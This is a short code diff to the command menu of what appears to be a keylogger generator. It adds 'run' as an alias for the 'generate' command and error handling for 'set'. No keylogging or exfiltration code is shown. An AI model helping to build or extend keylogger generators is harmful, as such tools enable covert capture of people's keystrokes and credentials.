@@ -171,7 +171,7 @@ def activate_generation(program_path):
             print_generation_options(saved_inputs_dict)
         
         # if the command is generate then generate the key logger
-        elif command == 'generate':
+        elif command == 'generate' or command == 'run':
             generate_keylogger(saved_inputs_dict)
         
         # if clear clear the screen
@@ -192,9 +192,12 @@ def activate_generation(program_path):
 
         # if the command is set then update the settings wales
         elif command.split()[0] == 'set':
-            setting = command.split()[1]
-            new_value = command.split()[2]
-            saved_inputs_dict = update_setting(setting, new_value, saved_inputs_dict)
+            try:
+                setting = command.split()[1]
+                new_value = command.split()[2]
+                saved_inputs_dict = update_setting(setting, new_value, saved_inputs_dict)
+            except Exception as error:
+                print(colors.Red + '[✘]Error: {}'.format(error) + colors.RESET)
 
         # if the command is non of above it is a unreconised command
         else:
